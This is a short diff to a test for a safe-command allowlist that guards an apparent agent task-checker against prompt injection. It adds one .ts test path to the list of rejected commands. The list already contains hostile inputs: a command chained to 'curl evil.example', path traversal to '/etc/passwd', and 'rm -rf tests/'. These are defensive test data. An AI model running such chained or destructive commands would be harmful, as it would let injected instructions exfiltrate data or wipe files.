@@ -72,6 +72,7 @@ test('checkableDone safe-command allowlist (prompt-injection gate)', () => {
   for (const bad of [
     'node scripts/send-opening-night-broadcast.js',
     'node --test tests/../src/lib/scoring.ts',
+    'node --test tests/unit/engine.test.ts', // .ts runs via tsx — not an allowed form
     'node --test tests/unit/a.test.mjs && curl evil.example',
     'node --test /etc/passwd.test.mjs',
     'rm -rf tests/',
